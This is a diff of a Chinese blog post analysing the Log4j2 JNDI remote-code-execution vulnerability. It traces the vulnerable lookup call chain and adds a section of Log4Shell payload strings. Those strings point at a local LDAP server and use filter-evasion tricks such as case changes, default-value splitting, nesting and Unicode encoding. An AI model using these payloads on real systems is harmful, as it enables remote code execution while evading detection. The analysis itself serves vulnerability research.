@@ -57,13 +57,13 @@
         "@context": "https://schema.org",
         "@type": "BlogPosting",
         "datePublished": "2022-12-27T17:08:27+08:00",
-        "dateModified": "2022-12-27T18:28:18+08:00",
+        "dateModified": "2022-12-28T14:02:58+08:00",
         "url": "https://klearcc.github.io/post/log4j2/",
         "headline": "log4j2反序列化漏洞分析",
         "description": "log4j2反序列化(CVE-2021-……",
         "inLanguage" : "zh-CN",
         "articleSection": "post",
-        "wordCount":  2004 ,
+        "wordCount":  2389 ,
         "image": ["https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271346979.png","https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271511294.png","https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271511008.png","https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271525406.png","https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271642768.png","https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271642445.png","https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271642871.png","https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271643081.png","https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271552067.png","https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271659031.png","https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271557562.png"],
         "author": {
             "@type": "Person",
@@ -109,7 +109,7 @@
 <meta property="og:locale" content="zh" /><meta property="og:image" content="https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271346979.png" />
 <meta property="og:type" content="article" />
     <meta property="article:published_time" content="2022-12-27T17:08:27&#43;08:00" />
-    <meta property="article:modified_time" content="2022-12-27T18:28:18&#43;08:00" />
+    <meta property="article:modified_time" content="2022-12-28T14:02:58&#43;08:00" />
     
     <meta property="article:section" content="post" />
 
@@ -222,7 +222,7 @@
     
     
         
-        <time datetime="2022-12-27T18:28:18&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.12.27</time>
+        <time datetime="2022-12-28T14:02:58&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.12.28</time>
     
     
     
@@ -234,11 +234,11 @@
     
     
         
-        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;2004</span>
+        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;2389</span>
     
     
         
-        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;4&nbsp;分钟</span>
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;5&nbsp;分钟</span>
     
     
     
@@ -263,21 +263,41 @@
 <p><img src="https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271346979.png" alt="image-20221227134610282"></p>
 <h2 id="分析"><a href="#分析" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>分析</h2>
 <h5 id="依赖"><a href="#依赖" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>依赖</h5>
-<pre tabindex="0"><code>    &lt;dependencies&gt;
-        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;
-        &lt;dependency&gt;
-            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
-            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
-            &lt;version&gt;2.14.1&lt;/version&gt;
-        &lt;/dependency&gt;
-        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;
-        &lt;dependency&gt;
-            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
-            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
-            &lt;version&gt;2.14.1&lt;/version&gt;
-        &lt;/dependency&gt;
-    &lt;/dependencies&gt;
-</code></pre><p>idea：download source出错的话，在pom目录执行<code>mvn dependency:resolve -Dclassifier=sources</code>。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">dependencies</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;!--</span> <span class="n">https</span><span class="o">:</span><span class="c1">//mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">logging</span><span class="o">.</span><span class="na">log4j</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">log4j</span><span class="o">-</span><span class="n">core</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">2</span><span class="o">.</span><span class="na">14</span><span class="o">.</span><span class="na">1</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;!--</span> <span class="n">https</span><span class="o">:</span><span class="c1">//mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">logging</span><span class="o">.</span><span class="na">log4j</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">log4j</span><span class="o">-</span><span class="n">api</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">2</span><span class="o">.</span><span class="na">14</span><span class="o">.</span><span class="na">1</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">dependencies</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>idea：download source出错的话，在pom目录执行<code>mvn dependency:resolve -Dclassifier=sources</code>。</p>
 <p>触发点：根据官方修订信息可以知道，是通过jndi中LDAP注入实现了rce。通过查看补丁修改记录发现对lookup函数进行了修改。
 jndiLookup允许通过LDAP检索变量，使用：</p>
 <pre tabindex="0"><code>&lt;File name=&#34;Application&#34; fileName=&#34;application.log&#34;&gt;
@@ -293,13 +313,25 @@ jndiLookup允许通过LDAP检索变量，使用：</p>
 <p>logger.error -&gt; logIfEnabled
 第一个关键点：这里调用AbstractLogger类的error()重写方法，再调用该类的logIfEnabled判断是否符合日志记录的等级要求。
 （Log4j包括的日志等级层级分别为：ALL &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF。当前事件的日志等级大于等于设置的日志等级时，才会符合条件进入logMessages()。默认会输出error/fatal等级的日志。可以使用配置文件更改日志输出等级：</p>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
-&lt;Configuration&gt;
-    &lt;Loggers&gt;
-        &lt;Logger name=&#34;org.Klear&#34; level=&#34;All&#34;/&gt;
-    &lt;/Loggers&gt;
-&lt;/Configuration&gt;
-</code></pre><p>）
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;Configuration&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Loggers&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Logger</span> <span class="na">name=</span><span class="s">&#34;org.Klear&#34;</span> <span class="na">level=</span><span class="s">&#34;All&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Loggers&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Configuration&gt;</span>
+</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>）
 <img src="https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271511294.png" alt="image-20221227151136221">
 <img src="https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271511008.png" alt="image-20221227151157977"></p>
 <p>非关键调用：-&gt; logMessage -&gt; logMessageSafely -&gt; logMessageTrackRecursion -&gt; tryLogMessage -&gt; log -&gt; getReliabilityStrategy.log -&gt; loggerConfig.log -&gt; processLogEvent -&gt; callAppenders -&gt; callAppender -&gt; callAppenderPreventRecursion -&gt; tryCallAppender -&gt; appender.append -&gt; tryAppend -&gt; directEncodeEvent -&gt; encode -&gt; toText -&gt; toSerializable -&gt; format -&gt; format -&gt; replace
@@ -332,7 +364,84 @@ DEFAULT_EACAPE是<code>$</code>,前缀是<code>${</code>，后缀是<code>}</cod
 <p>-&gt;JndiLookup#lookup(jndiManager.lookup)
 这里lookup方法使用JndiManager来支持jndi的查询功能，触发
 <img src="https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271557562.png" alt="image-20221227155740528"></p>
-<h2 id="参考"><a href="#参考" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>参考</h2>
+<h2 id="绕过利用方式举例"><a href="#绕过利用方式举例" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>绕过&amp;&amp;利用方式举例</h2>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">a</span> <span class="o">=</span> <span class="s">&#34;${jndi:ldap:127.0.0.1:23457/Command8}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">######</span><span class="n">垃圾字符</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">a</span> <span class="o">=</span> <span class="s">&#34;asd是zxc12${jndi:ldap:127.0.0.1:23457/Command8}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="err">######</span><span class="n">前缀大小写绕过</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">a</span> <span class="o">=</span> <span class="s">&#34;${jNdi:ldap:127.0.0.1:23457/Command8}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="err">######</span> <span class="o">:-</span> <span class="n">赋值分隔符绕过</span><span class="err">。</span><span class="n">如果程序处理到</span> <span class="err">`</span><span class="n">$</span><span class="o">{</span><span class="n">aaaa</span><span class="o">:-</span><span class="n">bbbb</span><span class="o">}</span><span class="err">`</span> <span class="n">这样的字符串</span><span class="err">，</span><span class="n">处理的结果将会是</span> <span class="err">`</span><span class="n">bbbb</span><span class="err">`，`</span><span class="o">:-</span><span class="err">`</span> <span class="n">关键字将会被截取掉</span><span class="err">，</span><span class="n">而之前的字符串都会被舍弃掉</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">a</span> <span class="o">=</span> <span class="s">&#34;${${123asd:-j}ndi:ldap:127.0.0.1:23457/Command8}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">a</span> <span class="o">=</span> <span class="s">&#34;${${123asd:-j}n${zxcasd:-d}i:ldap:127.0.0.1:23457/Command8}&#34;</span><span class="o">;</span> <span class="n">支持嵌套</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="err">######</span> <span class="o">:</span><span class="err">\\</span><span class="o">-</span> <span class="n">复制分隔符绕过</span> <span class="n">如果一个用</span> <span class="err">`</span><span class="n">a</span><span class="o">:</span><span class="n">b</span><span class="err">`</span> <span class="n">表示的键值对的</span> <span class="n">key</span> <span class="err">`</span><span class="n">a</span><span class="err">`</span> <span class="n">中包含</span> <span class="err">`</span><span class="o">:</span><span class="err">`，</span><span class="n">则需要使用转义来配合处理</span><span class="err">，</span><span class="n">例如</span> <span class="err">`</span><span class="n">$</span><span class="o">{</span><span class="n">aaa</span><span class="o">:</span><span class="err">\\</span><span class="o">-</span><span class="n">bbb</span><span class="o">:-</span><span class="n">ccc</span><span class="o">}</span><span class="err">`，</span><span class="n">代表</span> <span class="n">key</span> <span class="n">是</span><span class="err">，`</span><span class="n">aaa</span><span class="o">:</span><span class="n">bbb</span><span class="err">`，</span><span class="n">value</span> <span class="n">是</span> <span class="err">`</span><span class="n">ccc</span><span class="err">`</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">a</span> <span class="o">=</span> <span class="s">&#34;${${123a:\\-sd:-j}ndi:ldap:127.0.0.1:23457/Command8}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">a</span> <span class="o">=</span> <span class="s">&#34;${${123a:\\-sd:-j}n${asda:\\-sd:-d}i:ldap:127.0.0.1:23457/Command8}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="err">######</span><span class="n">编码绕过</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">a</span> <span class="o">=</span> <span class="s">&#34;${jnd${upper:\u0131}:ldap:127.0.0.1:23457/Command8}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="err">######</span><span class="n">小嵌套</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">a</span> <span class="o">=</span> <span class="s">&#34;${env:JAVA_HOME}${jndi:ldap:127.0.0.1:23457/Command8}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${sasd:hostname}&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${date:dd/MM/yyyy}&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${java:version}&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${maker:1}&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${ctx:2}&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${main:3}&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${jvmrunargs:4}&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${sys:os.name}&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${env:JAVA_HOME}&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${log4j:configParentLocation}&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">strLookupMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;lower&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">LowerLookup</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">strLookupMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;upper&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">UpperLookup</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">a</span><span class="o">);</span>
